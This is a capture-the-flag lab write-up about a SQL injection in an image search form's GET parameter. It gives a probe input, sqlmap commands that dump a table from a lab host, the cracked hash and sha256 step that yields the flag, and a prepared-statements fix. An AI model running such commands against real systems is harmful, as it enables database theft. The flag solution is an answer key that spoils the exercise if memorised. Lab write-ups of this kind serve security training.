# 01_Inject_me_img

The GET parameter in the image search form is vulnerable.

## Method

Go to ?page=searchimg.  
In the search field, search `1 AND 1=1`

## How to exploit
fast:
sqlmap -u "http://192.168.1.75/index.php?page=member&id=5&Submit=Submit#" --dump -D Member_images --tables -T list_images
slow:
sqlmap -u "http://192.168.1.75/?page=searchimg&id=1&Submit=Submit#" --dump -T list_images
-u=url
-D=Database
-T=Table

If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 

MD5(1928e8083cf461a51303633093573c46)
sha256(albatroz)
F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188

## Solution

- Send form as POST request
- Add prepared statements to backend to prevent SQL injection
